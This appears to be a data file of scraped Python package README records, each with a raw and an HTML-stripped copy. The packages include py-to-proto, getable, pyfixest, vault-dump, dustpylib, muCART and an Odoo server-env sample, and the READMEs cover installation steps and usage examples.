        -   Learning curve to understand the full ecosystem
        -   Not a familiar tool outside of service engineering
        -   Static compilation step required to use in code
-   Python schemas:
    -   **Advantages**
        -   Can be learned quickly using pure-python documentation
        -   Can be written inline in pure python
    -   **Disadvantages**
        -   Generally, no standard serialization beyond `json`
        -   No automated service implementations
        -   No/manual mechanism for usage in other programming languages

This project aims to bring the advantages of both types of schema representation so that a given project can take advantage of the best of both:

-   Define your structures in pure python for simplicity
-   Dynamically create [`google.protobuf.Descriptor`](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/descriptor.py#L245) objects to allow for `protobuf` serialization and deserialization
-   Reverse render a `.proto` file from the generated `Descriptor` so that stubs can be generated in other languages
-   No static compiliation needed!

## Supported Python Schema Types

Currently, objects can be declared using either [python `dataclasses`](https://docs.python.org/3/library/dataclasses.html) or [Json TypeDef (JTD)](https://jsontypedef.com/). Additional schemas can be added by [subclassing `ConverterBase`](py_to_proto/converter_base.py).

### Dataclass To Proto

The following example illustrates how `dataclasses` and `enums` can be converted to proto:

```py
from dataclasses import dataclass
from enum import Enum
from typing import Annotated, Dict, List, Enum
import py_to_proto

# Define the Foo structure as a python dataclass, including a nested enum
@dataclass
class Foo:

    class BarEnum(Enum):
        EXAM: 0
        JOKE_SETTING: 1

    foo: bool
    bar: List[BarEnum]

# Define the Foo protobuf message class
FooProto = py_to_proto.descriptor_to_message_class(
    py_to_proto.dataclass_to_proto(
        package=""foobar"",
        dataclass_=Foo,
    )
)

# Declare the Bar structure as a python dataclass with a reference to the
# FooProto type
@dataclass
class Bar:
    baz: FooProto

# Define the Bar protobuf message class
BarProto = py_to_proto.descriptor_to_message_class(
    py_to_proto.dataclass_to_proto(
        package=""foobar"",
        dataclass_=Bar,
    )
)

# Instantiate a BarProto
print(BarProto(baz=FooProto(foo=True, bar=[Foo.BarEnum.EXAM.value])))

def write_protos(proto_dir: str):
    """"""Write out the .proto files for FooProto and BarProto to the given
    directory
    """"""
    FooProto.write_proto_file(proto_dir)
    BarProto.write_proto_file(proto_dir)
```

### JTD To Proto

The following example illustrates how JTD schemas can be converted to proto:

```py
import py_to_proto

# Declare the Foo protobuf message class
Foo = py_to_proto.descriptor_to_message_class(
    py_to_proto.jtd_to_proto(
        name=""Foo"",
        package=""foobar"",
        jtd_def={
            ""properties"": {
                # Bool field
                ""foo"": {
                    ""type"": ""boolean"",
                },
                # Array of nested enum values
                ""bar"": {
                    ""elements"": {
                        ""enum"": [""EXAM"", ""JOKE_SETTING""],
                    }
                }
            }
        },
    )
)

# Declare an object that references Foo as the type for a field
Bar = py_to_proto.descriptor_to_message_class(
    py_to_proto.jtd_to_proto(
        name=""Bar"",
        package=""foobar"",
        jtd_def={
            ""properties"": {
                ""baz"": {
                    ""type"": Foo.DESCRIPTOR,
                },
            },
        },
    ),
)

def write_protos(proto_dir: str):
    """"""Write out the .proto files for Foo and Bar to the given directory""""""
    Foo.write_proto_file(proto_dir)
    Bar.write_proto_file(proto_dir)
```

## Similar Projects

There are a number of similar projects in this space that offer slightly different value:

-   [`jtd-codegen`](https://jsontypedef.com/docs/jtd-codegen/): This project focuses on statically generating language-native code (including `python`) to represent the JTD schema.
-   [`py-json-to-proto`](https://pypi.org/project/py-json-to-proto/): This project aims to deduce a schema from an instance of a `json` object.
-   [`pure-protobuf`](https://pypi.org/project/pure-protobuf/): This project has a very similar aim to `py-to-proto`, but it skips the intermediate `descriptor` representation and thus is not able to produce native `message.Message` classes.


","# PY To Proto

This library holds utilities for converting in-memory data schema representations to [Protobuf](https://developers.google.com/protocol-buffers). The intent is to allow python libraries to leverage the power of `protobuf` while maintaining the source-of-truth for their data in pure python and avoiding static build steps.

## Why?

The `protobuf` langauge is a powerful tool for defining language-agnostic, composable datastructures. `Protobuf` also offers cross-language compatibility so that a given set of definitions can be compiled into numerous target programming languages. The downside is that `protobuf` requires_a static built step to perform this `proto` -> `X` conversion step. Alternately, there are multiple ways of representing data schemas in pure python which allow a python library to interact with well-typed data objects. The downside here is that these structures can not easily be used from other programming languages. The pros/cons of these generally fall along the following lines:

-   `Protobuf`:
    -   **Advantages**
        -   Compact serialization
        -   Auto-generated [`grpc`](https://grpc.io/) client and service libraries
        -   Client libraries can be used from different programming languages
    -   **Disadvantages**
        -   Learning curve to understand the full ecosystem
        -   Not a familiar tool outside of service engineering
        -   Static compilation step required to use in code
-   Python schemas:
    -   **Advantages**
        -   Can be learned quickly using pure-python documentation
        -   Can be written inline in pure python
    -   **Disadvantages**
        -   Generally, no standard serialization beyond `json`
        -   No automated service implementations
        -   No/manual mechanism for usage in other programming languages

This project aims to bring the advantages of both types of schema representation so that a given project can take advantage of the best of both:

-   Define your structures in pure python for simplicity
-   Dynamically create [`google.protobuf.Descriptor`](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/descriptor.py#L245) objects to allow for `protobuf` serialization and deserialization
-   Reverse render a `.proto` file from the generated `Descriptor` so that stubs can be generated in other languages
-   No static compiliation needed!

## Supported Python Schema Types

Currently, objects can be declared using either [python `dataclasses`](https://docs.python.org/3/library/dataclasses.html) or [Json TypeDef (JTD)](https://jsontypedef.com/). Additional schemas can be added by [subclassing `ConverterBase`](py_to_proto/converter_base.py).

### Dataclass To Proto

The following example illustrates how `dataclasses` and `enums` can be converted to proto:

```py
from dataclasses import dataclass
from enum import Enum
from typing import Annotated, Dict, List, Enum
import py_to_proto

# Define the Foo structure as a python dataclass, including a nested enum
@dataclass
class Foo:

    class BarEnum(Enum):
        EXAM: 0
        JOKE_SETTING: 1

    foo: bool
    bar: List[BarEnum]

# Define the Foo protobuf message class
FooProto = py_to_proto.descriptor_to_message_class(
    py_to_proto.dataclass_to_proto(
        package=""foobar"",
        dataclass_=Foo,
    )
)

# Declare the Bar structure as a python dataclass with a reference to the
# FooProto type
@dataclass
class Bar:
    baz: FooProto

# Define the Bar protobuf message class
BarProto = py_to_proto.descriptor_to_message_class(
    py_to_proto.dataclass_to_proto(
        package=""foobar"",
        dataclass_=Bar,
    )
)

# Instantiate a BarProto
print(BarProto(baz=FooProto(foo=True, bar=[Foo.BarEnum.EXAM.value])))

def write_protos(proto_dir: str):
    """"""Write out the .proto files for FooProto and BarProto to the given
    directory
    """"""
    FooProto.write_proto_file(proto_dir)
    BarProto.write_proto_file(proto_dir)
```

### JTD To Proto

The following example illustrates how JTD schemas can be converted to proto:

```py
import py_to_proto

# Declare the Foo protobuf message class
Foo = py_to_proto.descriptor_to_message_class(
    py_to_proto.jtd_to_proto(
        name=""Foo"",
        package=""foobar"",
        jtd_def={
            ""properties"": {
                # Bool field
                ""foo"": {
                    ""type"": ""boolean"",
                },
                # Array of nested enum values
                ""bar"": {
                    ""elements"": {
                        ""enum"": [""EXAM"", ""JOKE_SETTING""],
                    }
                }
            }
        },
    )
)

# Declare an object that references Foo as the type for a field
Bar = py_to_proto.descriptor_to_message_class(
    py_to_proto.jtd_to_proto(
        name=""Bar"",
        package=""foobar"",
        jtd_def={
            ""properties"": {
                ""baz"": {
                    ""type"": Foo.DESCRIPTOR,
                },
            },
        },
    ),
)

def write_protos(proto_dir: str):
    """"""Write out the .proto files for Foo and Bar to the given directory""""""
    Foo.write_proto_file(proto_dir)
    Bar.write_proto_file(proto_dir)
```

## Similar Projects

There are a number of similar projects in this space that offer slightly different value:

-   [`jtd-codegen`](https://jsontypedef.com/docs/jtd-codegen/): This project focuses on statically generating language-native code (including `python`) to represent the JTD schema.
-   [`py-json-to-proto`](https://pypi.org/project/py-json-to-proto/): This project aims to deduce a schema from an instance of a `json` object.
-   [`pure-protobuf`](https://pypi.org/project/pure-protobuf/): This project has a very similar aim to `py-to-proto`, but it skips the intermediate `descriptor` representation and thus is not able to produce native `message.Message` classes.


",ibm/py-to-proto
uphill,https://github.com/yinanxu0/uphill,16,0,0,,,yinanxu0/uphill
getable,https://github.com/zhaoblake/getable,3,2255,1265,"# getable

A simple tool to parse HTML table to a 2d-array-like data structure.

## Installation

```bash
pip install getable
```

## Usage

Now we get a standard HTML table like below, let's see what we can do with getable.
<table id=""standardTable"">
        <thead>
        <tr>
            <th>House</th>
            <th>Region</th>
            <th>Seat</th>
            <th>Words</th>
        </tr>
        </thead>
        <tbody>
        <tr>
            <td>Targaryen</td>
            <td>Crownlands</td>
            <td>Dragonstone</td>
            <td>Fire and Blood</td>
        </tr>
        <tr>
            <td>Stark</td>
            <td>North</td>
            <td>Winterfell</td>
            <td>Winter is Coming</td>
        </tr>
        <tr>
            <td>Lannister</td>
            <td>Westerlands</td>
            <td>Casterly Rock</td>
            <td>Hear Me Roar</td>
        </tr>
        <tr>
            <td>Greyjoy</td>
            <td>Iron Islands</td>
            <td>Pyke</td>
            <td>We Do Not Sow</td>
        </tr>
        </tbody>
    </table>

```python
from getable import TableParser

source = """"""
<table id=""standardTable"">
    <thead>
        <tr><th>House</th><th>Region</th><th>Seat</th><th>Words</th></tr>
    </thead>
    <tbody>
        <tr><td>Targaryen</td><td>Crownlands</td><td>Dragonstone</td><td>Fire and Blood</td></tr>
        <tr><td>Stark</td><td>North</td><td>Winterfell</td><td>Winter is Coming</td></tr>
        <tr><td>Lannister</td><td>Westerlands</td><td>Casterly Rock</td><td>Hear Me Roar</td></tr>
        <tr><td>Greyjoy</td><td>Iron Islands</td><td>Pyke</td><td>We Do Not Sow</td></tr>
    </tbody>
</table>
""""""

table_parser = TableParser()
table = table_parser.parse(source=source, locator=""#standardTable"")

print(table.head)  # House, Region, Seat, Words
print(table.head[0].text)  # House

print(table.body)
""""""
Targaryen, Crownlands, Dragonstone, Fire and Blood
Stark, North, Winterfell, Winter is Coming
Lannister, Westerlands, Casterly Rock, Hear Me Roar
Greyjoy, Iron Islands, Pyke, We Do Not Sow
""""""

print(table.body[-1][-1].text)  # We Do Not Sow
print(table[-1][-1].text)  # We Do Not Sow
```

## License

This project is licensed under the terms of the MIT license.


","# getable

A simple tool to parse HTML table to a 2d-array-like data structure.

## Installation

```bash
pip install getable
```

## Usage

Now we get a standard HTML table like below, let's see what we can do with getable.



House
Region
Seat
Words




Targaryen
Crownlands
Dragonstone
Fire and Blood


Stark
North
Winterfell
Winter is Coming


Lannister
Westerlands
Casterly Rock
Hear Me Roar


Greyjoy
Iron Islands
Pyke
We Do Not Sow




```python
from getable import TableParser

source = """"""


HouseRegionSeatWords


TargaryenCrownlandsDragonstoneFire and Blood
StarkNorthWinterfellWinter is Coming
LannisterWesterlandsCasterly RockHear Me Roar
GreyjoyIron IslandsPykeWe Do Not Sow


""""""

table_parser = TableParser()
table = table_parser.parse(source=source, locator=""#standardTable"")

print(table.head)  # House, Region, Seat, Words
print(table.head[0].text)  # House

print(table.body)
""""""
Targaryen, Crownlands, Dragonstone, Fire and Blood
Stark, North, Winterfell, Winter is Coming
Lannister, Westerlands, Casterly Rock, Hear Me Roar
Greyjoy, Iron Islands, Pyke, We Do Not Sow
""""""

print(table.body[-1][-1].text)  # We Do Not Sow
print(table[-1][-1].text)  # We Do Not Sow
```

## License

This project is licensed under the terms of the MIT license.


",zhaoblake/getable
pyfixest,https://github.com/s3alfisc/pyfixest,7,757,757,"## PyFixest


This is a draft package (highly experimental!) for a Python clone of the excellent [fixest](https://github.com/lrberge/fixest) package.

Fixed effects are projected out via the [PyHDFE](https://github.com/jeffgortmaker/pyhdfe) package.

For a quick introduction, see the [tutorial](https://s3alfisc.github.io/pyfixest/tutorial/).

```python
import pyfixest as pf
from pyfixest.utils import get_data

data = get_data()

fixest = pf.Fixest(data = data)
fixest.feols(""Y~X1 | X2"", vcov = ""HC1"")
fixest.summary()

# ###
#
# model: feols()
# fml: Y~X1 | X2
# ---
# ###
#
# Fixed effects:  X2
# Dep. var.:  Y
# Inference:  HC1
# Observations:  998
#
#     Estimate  Std. Error   t value  Pr(>|t|)
# X1 -0.142274    0.210556 -0.675707  0.499383
```


","## PyFixest


This is a draft package (highly experimental!) for a Python clone of the excellent [fixest](https://github.com/lrberge/fixest) package.

Fixed effects are projected out via the [PyHDFE](https://github.com/jeffgortmaker/pyhdfe) package.

For a quick introduction, see the [tutorial](https://s3alfisc.github.io/pyfixest/tutorial/).

```python
import pyfixest as pf
from pyfixest.utils import get_data

data = get_data()

fixest = pf.Fixest(data = data)
fixest.feols(""Y~X1 | X2"", vcov = ""HC1"")
fixest.summary()

# ###
#
# model: feols()
# fml: Y~X1 | X2
# ---
# ###
#
# Fixed effects:  X2
# Dep. var.:  Y
# Inference:  HC1
# Observations:  998
#
#     Estimate  Std. Error   t value  Pr(>|t|)
# X1 -0.142274    0.210556 -0.675707  0.499383
```


",s3alfisc/pyfixest
vault-dump,https://github.com/danielpops/vault-dump,1,424,424,"# vault-dump
Tool that dumps all the vault configurations of a live running vault server to disk in yaml format

This does not actually dump any secret material, only configuration

TODO:
- Refactor a bunch
- Create proper class(es) instead of one everything thrown into a single `main.py`
- Command line argument parsing
- Test on more live vault instances which might have more entity types than the ones I've tested with
","# vault-dump
Tool that dumps all the vault configurations of a live running vault server to disk in yaml format

This does not actually dump any secret material, only configuration

TODO:
- Refactor a bunch
- Create proper class(es) instead of one everything thrown into a single `main.py`
- Command line argument parsing
- Test on more live vault instances which might have more entity types than the ones I've tested with
",danielpops/vault-dump
aacommpy,https://github.com/jamesbond90/aacommpyDownloader,0,52,52,"this is the readme content of the aacommpy package
","this is the readme content of the aacommpy package
",jamesbond90/aacommpydownloader
dustpylib,https://github.com/stammler/dustpylib/,7,1416,1416,"# dustpylib

[![Documentation Status](https://readthedocs.org/projects/dustpylib/badge/?version=latest)](https://dustpylib.readthedocs.io/en/latest/?badge=latest) [![GitHub](https://img.shields.io/github/license/stammler/dustpylib)](https://github.com/stammler/dustpylib/blob/master/LICENSE) [![Contributor Covenant](https://img.shields.io/badge/Contributor%20Covenant-2.1-4baaaa.svg)](https://github.com/stammler/dustpylib/blob/master/.github/CODE_OF_CONDUCT.md)  
[![PyPI - Downloads](https://img.shields.io/pypi/dm/dustpylib?label=PyPI%20downloads)](https://pypistats.org/packages/dustpylib)


`dustpylib` is a library that contains auxiliary modules for the dust evolution software `DustPy`, for example interfaces to radiative transfer codes or modules with extensions to the `DustPy` defaults.

For information about the usage of ``DustPy``, please have a look at the [DustPy documentation](https://stammler.github.io/dustpy/).


## Installation

`dustpylib` can be installed via PyPI.

`pip install dustpylib`

## Documentation

For the usage of `dustpylib` please have a look at its [documentation](https://dustpylib.rtfd.io/).

* [Radiative Transfer](https://dustpylib.readthedocs.io/en/latest/radtrans.html)
  - [RADMC-3D](https://dustpylib.readthedocs.io/en/latest/radmc3d.html)
* [A. Contributing / Bug reports / Features requests](https://dustpylib.readthedocs.io/en/latest/A_contrib_bug_feature.html)

","# dustpylib

[![Documentation Status](https://readthedocs.org/projects/dustpylib/badge/?version=latest)](https://dustpylib.readthedocs.io/en/latest/?badge=latest) [![GitHub](https://img.shields.io/github/license/stammler/dustpylib)](https://github.com/stammler/dustpylib/blob/master/LICENSE) [![Contributor Covenant](https://img.shields.io/badge/Contributor%20Covenant-2.1-4baaaa.svg)](https://github.com/stammler/dustpylib/blob/master/.github/CODE_OF_CONDUCT.md)  
[![PyPI - Downloads](https://img.shields.io/pypi/dm/dustpylib?label=PyPI%20downloads)](https://pypistats.org/packages/dustpylib)


`dustpylib` is a library that contains auxiliary modules for the dust evolution software `DustPy`, for example interfaces to radiative transfer codes or modules with extensions to the `DustPy` defaults.

For information about the usage of ``DustPy``, please have a look at the [DustPy documentation](https://stammler.github.io/dustpy/).


## Installation

`dustpylib` can be installed via PyPI.

`pip install dustpylib`

## Documentation

For the usage of `dustpylib` please have a look at its [documentation](https://dustpylib.rtfd.io/).

* [Radiative Transfer](https://dustpylib.readthedocs.io/en/latest/radtrans.html)
  - [RADMC-3D](https://dustpylib.readthedocs.io/en/latest/radmc3d.html)
* [A. Contributing / Bug reports / Features requests](https://dustpylib.readthedocs.io/en/latest/A_contrib_bug_feature.html)

",stammler/dustpylib
fineslice,https://github.com/nx10/fineslice,1,717,717,"# `fineslice`

`fineslice` is a lightweight sampler for 3D-affine transformed images (commonly used in neuroscience) implemented in 
pure Python + NumPy.

It does not make any assumptions about the data. Pass _any_ image texture and affine matrix directly into it.

### Features

- Precision sampling (no need to 're-sample' and loose precision)
- Automatically finds optimal dimensions
- Only depends on NumPy

### Usage with `nibabel`

For the best performance directly pass in the `nibabel` data object as a texture:

```Python
import nibabel as nib
import fineslice as fine

img = nib.load('my_image.nii.gz')

out = fine.sample_0d(
    texture=img.dataobj,
    affine=img.affine,
    out_position=(0, 0, 0)
)
```
","# `fineslice`

`fineslice` is a lightweight sampler for 3D-affine transformed images (commonly used in neuroscience) implemented in 
pure Python + NumPy.

It does not make any assumptions about the data. Pass _any_ image texture and affine matrix directly into it.

### Features

- Precision sampling (no need to 're-sample' and loose precision)
- Automatically finds optimal dimensions
- Only depends on NumPy

### Usage with `nibabel`

For the best performance directly pass in the `nibabel` data object as a texture:

```Python
import nibabel as nib
import fineslice as fine

img = nib.load('my_image.nii.gz')

out = fine.sample_0d(
    texture=img.dataobj,
    affine=img.affine,
    out_position=(0, 0, 0)
)
```
",nx10/fineslice
colorfultxt,https://github.com/pypa/sampleproject,0,2356,2356,"
# Make sure you have upgraded version of pip
Windows
```
py -m pip install --upgrade pip
```

Linux/MAC OS
```
python3 -m pip install --upgrade pip
```

## Create a project with the following structure
```
packaging_tutorial/
├── LICENSE
├── pyproject.toml
├── README.md
├── setup.cfg
├── src/
│   └── example_package/
│       ├── __init__.py
│       └── example.py
└── tests/
touch LICENSE
touch pyproject.toml
touch setup.cfg
mkdir src/mypackage
touch src/mypackage/__init__.py
touch src/mypackage/main.py
mkdir tests
```

## pyproject.toml 

This file tells tools like pip and build how to create your project

```
[build-system]
requires = [
    ""setuptools>=42"",
    ""wheel""
]
build-backend = ""setuptools.build_meta""
```
build-system.requires gives a list of packages that are needed to build your package. Listing something here will only make it available during the build, not after it is installed.

build-system.build-backend is the name of Python object that will be used to perform the build. If you were to use a different build system, such as flit or poetry, those would go here, and the configuration details would be completely different than the setuptools configuration described below.


# Setup.cfg setup
Using setup.cfg is a best practice, but you could have a dynamic setup file using setup.py

```
[metadata]
name = example-pkg-YOUR-USERNAME-HERE
version = 0.0.1
author = Example Author
author_email = author@example.com
description = A small example package
long_description = file: README.md
long_description_content_type = text/markdown
url = https://github.com/pypa/sampleproject
project_urls =
    Bug Tracker = https://github.com/pypa/sampleproject/issues
classifiers =
    Programming Language :: Python :: 3
    License :: OSI Approved :: MIT License
    Operating System :: OS Independent

[options]
package_dir =
    = src
packages = find:
python_requires = >=3.6

[options.packages.find]
where = src

```
# Running the build
### Make sure your build tool is up to date
Windows
```
py -m pip install --upgrade build
```
Linux/MAC OS
```
python3 -m pip install --upgrade build
```


### Create the build
```
py -m build
```













### References
https://packaging.python.org/tutorials/packaging-projects/
","
# Make sure you have upgraded version of pip
Windows
```
py -m pip install --upgrade pip
```

Linux/MAC OS
```
python3 -m pip install --upgrade pip
```

## Create a project with the following structure
```
packaging_tutorial/
├── LICENSE
├── pyproject.toml
├── README.md
├── setup.cfg
├── src/
│   └── example_package/
│       ├── __init__.py
│       └── example.py
└── tests/
touch LICENSE
touch pyproject.toml
touch setup.cfg
mkdir src/mypackage
touch src/mypackage/__init__.py
touch src/mypackage/main.py
mkdir tests
```

## pyproject.toml 

This file tells tools like pip and build how to create your project

```
[build-system]
requires = [
    ""setuptools>=42"",
    ""wheel""
]
build-backend = ""setuptools.build_meta""
```
build-system.requires gives a list of packages that are needed to build your package. Listing something here will only make it available during the build, not after it is installed.

build-system.build-backend is the name of Python object that will be used to perform the build. If you were to use a different build system, such as flit or poetry, those would go here, and the configuration details would be completely different than the setuptools configuration described below.


# Setup.cfg setup
Using setup.cfg is a best practice, but you could have a dynamic setup file using setup.py

```
[metadata]
name = example-pkg-YOUR-USERNAME-HERE
version = 0.0.1
author = Example Author
author_email = author@example.com
description = A small example package
long_description = file: README.md
long_description_content_type = text/markdown
url = https://github.com/pypa/sampleproject
project_urls =
    Bug Tracker = https://github.com/pypa/sampleproject/issues
classifiers =
    Programming Language :: Python :: 3
    License :: OSI Approved :: MIT License
    Operating System :: OS Independent

[options]
package_dir =
    = src
packages = find:
python_requires = >=3.6

[options.packages.find]
where = src

```
# Running the build
### Make sure your build tool is up to date
Windows
```
py -m pip install --upgrade build
```
Linux/MAC OS
```
python3 -m pip install --upgrade build
```


### Create the build
```
py -m build
```













### References
https://packaging.python.org/tutorials/packaging-projects/
",pypa/sampleproject
mucart,https://github.com/bellibot/muCART,0,3652,3652,"## muCART - Measure Inducing Classification and Regression Trees

`muCART` is a Python package that implements Measure Inducing Classification and Regression Trees for Functional Data.

The estimators are implemented with the familiar `fit`/`predict`/`score` interface, and also support multiple predictors of possibly different lengths (as a List of np.ndarray objects, one for each predictor). The following tasks are supported, based on the loss function inside each node of the tree:

- Regression (mse, mae)
- Binary and Multiclass Classification (gini, misclassification error, entropy)

A custom `cross-validation` object is provided in order to perform grid search hyperparameter tuning (with any splitter from `scikit-learn`), and uses `multiprocessing` for parallelization (default `n_jobs = -1`).

## Installation

The package can be installed from terminal with the command `pip install muCART`. Inside each node of the tree, the optimization problems (quadratic with equality and/or inequality constraints) are formulated using `Pyomo`, which in turn needs a `solver` to interface with. All the code was tested on Ubuntu using the solver [Ipopt](https://doi.org/10.1007/s10107-004-0559-y). You just need to download the [executable binary](https://ampl.com/products/solvers/open-source/#ipopt), and then add the folder that contains it to your path.


## Usage

The following lines show how to fit an estimator with its own parameters and grid search object, by using a `StratifiedKFold` splitter:

```sh
import numpy as np
import muCART.grid_search as gs
from muCART.mu_cart import muCARTClassifier
from sklearn.model_selection import StratifiedKFold
from sklearn.datasets import load_wine
from sklearn.metrics import balanced_accuracy_score

X, Y = load_wine(return_X_y = True)
train_index = [i for i in range(100)]
test_index = [i for i in range(100, len(X))]
# wrap the single predictor in a List
X = [X]

min_samples_leaf_list = [i for i in range(1,5)]
lambda_list = np.logspace(-5, 5, 10, base = 2)
solver_options = {'solver':'ipopt',
                  'max_iter':500}

estimator = muCARTClassifier(solver_options)
parameters = {'min_samples_leaf':min_samples_leaf_list,
              'lambda':lambda_list,
              'max_depth': [None]}
cv = StratifiedKFold(n_splits = 2,
                     random_state = 46,
                     shuffle = True)
grid_search = gs.GridSearchCV(estimator,
                              parameters,
                              cv,
                              scoring = balanced_accuracy_score,
                              verbose = False,
                              n_jobs = -1)
# extract train samples for each predictor
X_train = [X[i][train_index] for i in range(len(X))]
grid_search.fit(X_train,
                Y[train_index])
# extract test samples for each predictor
X_test = [X[i][test_index] for i in range(len(X))]
score = grid_search.score(X_test,
                          Y[test_index])
```
The test folder in the `github` repo contains two sample scripts that show how to use the estimator in both classification and regression tasks. Regarding the `scoring`, both estimators and the grid search class use `accuracy`/`R^2` as default scores (when the argument `scoring = None`), but you can provide any `Callable` scoring function found in `sklearn.metrics`. Beware that higher is better, and therefore when scoring with errors like `sklearn.metrics.mean_squared_error`, you need to wrap that in a custom function that changes its sign.

## Citing

The code published in this package has been used in the case studies of [this](https://doi.org/10.1002/sam.11569) paper.


","## muCART - Measure Inducing Classification and Regression Trees

`muCART` is a Python package that implements Measure Inducing Classification and Regression Trees for Functional Data.

The estimators are implemented with the familiar `fit`/`predict`/`score` interface, and also support multiple predictors of possibly different lengths (as a List of np.ndarray objects, one for each predictor). The following tasks are supported, based on the loss function inside each node of the tree:

- Regression (mse, mae)
- Binary and Multiclass Classification (gini, misclassification error, entropy)

A custom `cross-validation` object is provided in order to perform grid search hyperparameter tuning (with any splitter from `scikit-learn`), and uses `multiprocessing` for parallelization (default `n_jobs = -1`).

## Installation

The package can be installed from terminal with the command `pip install muCART`. Inside each node of the tree, the optimization problems (quadratic with equality and/or inequality constraints) are formulated using `Pyomo`, which in turn needs a `solver` to interface with. All the code was tested on Ubuntu using the solver [Ipopt](https://doi.org/10.1007/s10107-004-0559-y). You just need to download the [executable binary](https://ampl.com/products/solvers/open-source/#ipopt), and then add the folder that contains it to your path.


## Usage

The following lines show how to fit an estimator with its own parameters and grid search object, by using a `StratifiedKFold` splitter:

```sh
import numpy as np
import muCART.grid_search as gs
from muCART.mu_cart import muCARTClassifier
from sklearn.model_selection import StratifiedKFold
from sklearn.datasets import load_wine
from sklearn.metrics import balanced_accuracy_score

X, Y = load_wine(return_X_y = True)
train_index = [i for i in range(100)]
test_index = [i for i in range(100, len(X))]
# wrap the single predictor in a List
X = [X]

min_samples_leaf_list = [i for i in range(1,5)]
lambda_list = np.logspace(-5, 5, 10, base = 2)
solver_options = {'solver':'ipopt',
                  'max_iter':500}

estimator = muCARTClassifier(solver_options)
parameters = {'min_samples_leaf':min_samples_leaf_list,
              'lambda':lambda_list,
              'max_depth': [None]}
cv = StratifiedKFold(n_splits = 2,
                     random_state = 46,
                     shuffle = True)
grid_search = gs.GridSearchCV(estimator,
                              parameters,
                              cv,
                              scoring = balanced_accuracy_score,
                              verbose = False,
                              n_jobs = -1)
# extract train samples for each predictor
X_train = [X[i][train_index] for i in range(len(X))]
grid_search.fit(X_train,
                Y[train_index])
# extract test samples for each predictor
X_test = [X[i][test_index] for i in range(len(X))]
score = grid_search.score(X_test,
                          Y[test_index])
```
The test folder in the `github` repo contains two sample scripts that show how to use the estimator in both classification and regression tasks. Regarding the `scoring`, both estimators and the grid search class use `accuracy`/`R^2` as default scores (when the argument `scoring = None`), but you can provide any `Callable` scoring function found in `sklearn.metrics`. Beware that higher is better, and therefore when scoring with errors like `sklearn.metrics.mean_squared_error`, you need to wrap that in a custom function that changes its sign.

## Citing

The code published in this package has been used in the case studies of [this](https://doi.org/10.1002/sam.11569) paper.


",bellibot/mucart
odoo-addon-server-environment-files-sample,https://github.com/OCA/server-env,1,3005,2619,"================================================================
Example server configuration environment files repository module
================================================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/github-OCA%2Fserver--env-lightgray.png?logo=github
    :target: https://github.com/OCA/server-env/tree/15.0/server_environment_files_sample
    :alt: OCA/server-env
.. |badge3| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/server-env-15-0/server-env-15-0-server_environment_files_sample
    :alt: Translate me on Weblate
.. |badge4| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/254/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| 

This is an example module to be used for
`server_environment_files`. Check that module's README for more
information.

**Table of contents**

.. contents::
   :local:

Installation
============

Do not install this module as is. Copy it to a directory in your
addons-path and rename it to
`server_environment_files`, then edit the various configurations.

This module is not testable on runbot (see above).

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/server-env/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/server-env/issues/new?body=module:%20server_environment_files_sample%0Aversion:%2015.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Camptocamp

Contributors
~~~~~~~~~~~~

* Florent Xicluna (Wingo) <florent.xicluna@gmail.com>
* Nicolas Bessi <nicolas.bessi@camptocamp.com>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/server-env <https://github.com/OCA/server-env/tree/15.0/server_environment_files_sample>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","================================================================
Example server configuration environment files repository module
================================================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/github-OCA%2Fserver--env-lightgray.png?logo=github
    :target: https://github.com/OCA/server-env/tree/15.0/server_environment_files_sample
    :alt: OCA/server-env
.. |badge3| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/server-env-15-0/server-env-15-0-server_environment_files_sample
    :alt: Translate me on Weblate
.. |badge4| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/254/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| 

This is an example module to be used for
`server_environment_files`. Check that module's README for more
information.

**Table of contents**

.. contents::
   :local:

Installation
============

Do not install this module as is. Copy it to a directory in your
addons-path and rename it to
`server_environment_files`, then edit the various configurations.

This module is not testable on runbot (see above).

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Camptocamp

